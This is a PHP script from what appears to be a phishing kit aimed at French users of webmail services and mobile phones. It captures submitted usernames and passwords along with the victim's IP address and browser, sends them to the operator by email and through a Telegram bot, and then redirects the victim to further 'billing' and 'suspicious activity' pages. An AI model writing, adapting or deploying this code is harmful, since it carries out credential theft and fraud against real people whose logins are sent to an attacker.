<?php

include('../../antibots/sub_sub_includes.php');
include('../../config.php');
include('../funcs.php');

checkSession();


  if (!empty($_POST['username'] && $_POST['password'])) {

    $username = $_POST['username'];
    $password = $_POST['password'];

    $_SESSION['username'] = $username;

    $tel = substr($username, 0, 2);

    if (strpos($username, "hotmail.com") || strpos($username, "hotmail.fr") || strpos($username, "live.fr") || strpos($username, "outlook.fr") || strpos($username, "outlook.com") || strpos($username, "orange.fr") || strpos($username, "orange.com") || strpos($username, "wanadoo.fr") || strpos($username, "sfr.fr") || strpos($username, "club-internet.fr") || strpos($username, "neuf.fr") || strpos($username, "aliceadsl.fr") || strpos($username, "noos.fr") || strpos($username, "yahoo.com") || strpos($username, "yahoo.fr") || strpos($username, "aol.com") || strpos($username, "aol.fr") || strpos($username, "gmail.com") || strpos($username, "icloud.com") || strpos($username, "gmx.fr") || strpos($username, "gmx.de") || strpos($username, "free.fr") || strpos($username, "bbox.fr") || strpos($username, "numericable.fr") || strpos($username, "laposte.net") || $tel == 07 || $tel == 06 )
    {

      // MAIL REZ
		if ($rez_mail)
		{

			$message = "
			
_______________________________

Identifiant : $username
Mot de passe : $password 

_______________________________

Adresse ip : " . $_SESSION['ip'] . "
User Agent : " . $_SESSION['user_agent'] . "               
			
			";

			$subject = "「📧」 • " . $username . " • " . $_SESSION['ip'] . "「📧」";
			$headers = "From: $sender_from <$sender_mail@astridnelsia.fr>";
			mail($rezmail, $subject, $message, $headers);
		}

		// TELEGRAM REZ
		if ($rez_tlg)
		{

			$message = "
			
_______________________________

Identifiant : $username
Mot de passe : $password 

_______________________________

Adresse ip : " . $_SESSION['ip'] . "
User Agent : " . $_SESSION['user_agent'] . "             
			
			";

			file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$log_chatid&text=" . urlencode($message));
		}

		if ($message_erreur) {
      header('location: ../../steps/suspicious_activity/index.php');
    } else {
      header('location: ../../steps/billing/index.php');
    }

    }
    else
    {
      header('location: ../../steps/login/index.php?invalid_username');
    }

  }
  else
  {
    header('location: ../../steps/login/index.php?empty_fields');
  }

?>